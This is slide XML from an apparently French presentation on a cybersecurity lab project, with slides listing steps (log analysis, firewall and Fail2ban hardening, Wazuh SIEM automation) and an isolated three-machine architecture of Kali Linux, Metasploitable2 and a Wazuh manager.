            <a:endParaRPr sz="1150" b="0" i="0" u="none" strike="noStrike" cap="none">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="75" name="Google Shape;75;p5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="3639312"/>
            <a:ext cx="6675120" cy="749808"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 9756"/>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5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="749808" y="3831336"/>
            <a:ext cx="365760" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0E86C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5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1298448" y="3712464"/>
            <a:ext cx="580644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400"/>
              <a:buFont typeface="Calibri"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>Analyser les traces générées</a:t>
            </a:r>
            <a:endParaRPr sz="1400" b="0" i="0" u="none" strike="noStrike" cap="none">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="78" name="Google Shape;78;p5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1298448" y="4023360"/>
            <a:ext cx="580644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B6B7F"/>
              </a:buClr>
              <a:buSzPts val="1150"/>
              <a:buFont typeface="Calibri"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150" b="0" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="5B6B7F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>Étude des journaux système laissés par chaque attaque sur la victime</a:t>
            </a:r>
            <a:endParaRPr sz="1150" b="0" i="0" u="none" strike="noStrike" cap="none">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="79" name="Google Shape;79;p5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="4535424"/>
            <a:ext cx="6675120" cy="749808"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 9756"/>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5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="749808" y="4727448"/>
            <a:ext cx="365760" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0E9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5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1298448" y="4608576"/>
            <a:ext cx="580644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400"/>
              <a:buFont typeface="Calibri"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>Mettre en place des défenses</a:t>
            </a:r>
            <a:endParaRPr sz="1400" b="0" i="0" u="none" strike="noStrike" cap="none">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="82" name="Google Shape;82;p5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1298448" y="4919472"/>
            <a:ext cx="580644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B6B7F"/>
              </a:buClr>
              <a:buSzPts val="1150"/>
              <a:buFont typeface="Calibri"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150" b="0" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="5B6B7F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>Pare-feu, durcissement des services, bannissement automatique (Fail2ban)</a:t>
            </a:r>
            <a:endParaRPr sz="1150" b="0" i="0" u="none" strike="noStrike" cap="none">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="83" name="Google Shape;83;p5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="5431536"/>
            <a:ext cx="6675120" cy="749808"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 9756"/>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5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="749808" y="5623560"/>
            <a:ext cx="365760" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="D9770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5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1298448" y="5504688"/>
            <a:ext cx="580644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400"/>
              <a:buFont typeface="Calibri"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>Automatiser détection &amp; réaction</a:t>
            </a:r>
            <a:endParaRPr sz="1400" b="0" i="0" u="none" strike="noStrike" cap="none">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="86" name="Google Shape;86;p5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1298448" y="5815584"/>
            <a:ext cx="580644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B6B7F"/>
              </a:buClr>
              <a:buSzPts val="1150"/>
              <a:buFont typeface="Calibri"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150" b="0" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="5B6B7F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>Solution SIEM (Wazuh) + scripts Bash autonomes</a:t>
            </a:r>
            <a:endParaRPr sz="1150" b="0" i="0" u="none" strike="noStrike" cap="none">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="87" name="Google Shape;87;p5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7543800" y="1417320"/>
            <a:ext cx="4114800" cy="4892040"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2222"/>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5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7818120" y="1645920"/>
            <a:ext cx="365760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9E5E"/>
              </a:buClr>
              <a:buSzPts val="1200"/>
              <a:buFont typeface="Calibri"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="0E9E5E"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>ENVIRONNEMENT DE TEST</a:t>
            </a:r>
            <a:endParaRPr sz="1200" b="0" i="0" u="none" strike="noStrike" cap="none">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="89" name="Google Shape;89;p5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7818120" y="2148840"/>
            <a:ext cx="411480" cy="411480"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="E11D4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5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7818120" y="2148840"/>
            <a:ext cx="411480" cy="41148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91" name="Google Shape;91;p5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8366760" y="2093976"/>
            <a:ext cx="310896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450"/>
              <a:buFont typeface="Calibri"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1450" b="1" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>Kali Linux</a:t>
            </a:r>
            <a:endParaRPr sz="1450" b="0" i="0" u="none" strike="noStrike" cap="none">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="92" name="Google Shape;92;p5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8366760" y="2423160"/>
            <a:ext cx="3108960" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr spcFirstLastPara="1" wrap="square" lIns="91425" tIns="45700" rIns="91425" bIns="45700" anchor="ctr" anchorCtr="0">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" marR="0" lvl="0" indent="0" algn="l" rtl="0">
              <a:lnSpc>
                <a:spcPct val="127272"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="5B6B7F"/>
              </a:buClr>
              <a:buSzPts val="1100"/>
              <a:buFont typeface="Calibri"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1100" b="0" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="5B6B7F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>Machine attaquante — Red Team</a:t>
            </a:r>
            <a:endParaRPr sz="1100" b="0" i="0" u="none" strike="noStrike" cap="none">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="93" name="Google Shape;93;p5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7818120" y="3520440"/>
            <a:ext cx="411480" cy="411480"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0E86C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5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7818120" y="3520440"/>
            <a:ext cx="411480" cy="41148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95" name="Google Shape;95;p5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8366760" y="3465576"/>
            <a:ext cx="310896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450"/>
              <a:buFont typeface="Calibri"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1450" b="1" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>Metasploitable2</a:t>
            </a:r>
            <a:endParaRPr sz="1450" b="0" i="0" u="none" strike="noStrike" cap="none">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="96" name="Google Shape;96;p5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8366760" y="3794760"/>
            <a:ext cx="3108960" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr spcFirstLastPara="1" wrap="square" lIns="91425" tIns="45700" rIns="91425" bIns="45700" anchor="ctr" anchorCtr="0">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" marR="0" lvl="0" indent="0" algn="l" rtl="0">
              <a:lnSpc>
                <a:spcPct val="127272"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="5B6B7F"/>
              </a:buClr>
              <a:buSzPts val="1100"/>
              <a:buFont typeface="Calibri"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1100" b="0" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="5B6B7F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>Ubuntu 8.04 volontairement vulnérable — cible</a:t>
            </a:r>
            <a:endParaRPr sz="1100" b="0" i="0" u="none" strike="noStrike" cap="none">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="97" name="Google Shape;97;p5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7818120" y="4892040"/>
            <a:ext cx="411480" cy="411480"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0E9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5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7818120" y="4892040"/>
            <a:ext cx="411480" cy="41148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99" name="Google Shape;99;p5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8366760" y="4837176"/>
            <a:ext cx="310896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450"/>
              <a:buFont typeface="Calibri"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1450" b="1" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>Wazuh Manager</a:t>
            </a:r>
            <a:endParaRPr sz="1450" b="0" i="0" u="none" strike="noStrike" cap="none">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="100" name="Google Shape;100;p5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8366760" y="5166360"/>
            <a:ext cx="3108960" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr spcFirstLastPara="1" wrap="square" lIns="91425" tIns="45700" rIns="91425" bIns="45700" anchor="ctr" anchorCtr="0">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" marR="0" lvl="0" indent="0" algn="l" rtl="0">
              <a:lnSpc>
                <a:spcPct val="127272"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="5B6B7F"/>
              </a:buClr>
              <a:buSzPts val="1100"/>
              <a:buFont typeface="Calibri"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1100" b="0" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="5B6B7F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>SIEM — supervision, détection, réponse active</a:t>
            </a:r>
            <a:endParaRPr sz="1100" b="0" i="0" u="none" strike="noStrike" cap="none">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="101" name="Google Shape;101;p5"/>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a:solidFill>
                  <a:srgbClr val="5B6B7F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:sym typeface="Calibri"/>
              </a:rPr>
              <a:t>03</a:t>
            </a:r>
            <a:endParaRPr sz="1000" b="0" i="0" u="none" strike="noStrike" cap="none">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>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marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1" kern="0" spc="100" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0E9E5E"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>02 · ARCHITECTURE</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="685800"/>
            <a:ext cx="10058400" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1E293B"/>
                </a:solidFill>
                <a:latin typeface="Georgia" pitchFamily="34" charset="0"/>
                <a:ea typeface="Georgia" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Georgia" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Trois machines, un réseau privé isolé</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Shape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="380848" y="2148840"/>
            <a:ext cx="3108960" cy="2651760"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3448"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F5F7FA"/>
          </a:solidFill>
          <a:ln w="25400">
            <a:solidFill>
              <a:srgbClr val="E11D48"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="ar-SA" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Shape 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="792328" y="2404872"/>
            <a:ext cx="2286000" cy="566928"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 50000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="E11D48"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="fr-FR"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="6" name="Image 0" descr="lg_kali_w.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1084936" y="2523744"/>
            <a:ext cx="329184" cy="329184"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1432408" y="2404872"/>
            <a:ext cx="155448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KALI</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="380848" y="3172968"/>
            <a:ext cx="310896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Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>KALI LINUX</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="380848" y="3520440"/>
            <a:ext cx="3108960" cy="274320"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="ctr">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1100" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="475569"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Attaquant · Red Team</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="380848" y="4023360"/>
            <a:ext cx="3108960" cy="320040"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="ctr">
              <a:buNone/>
            </a:pPr>
            <a:r>
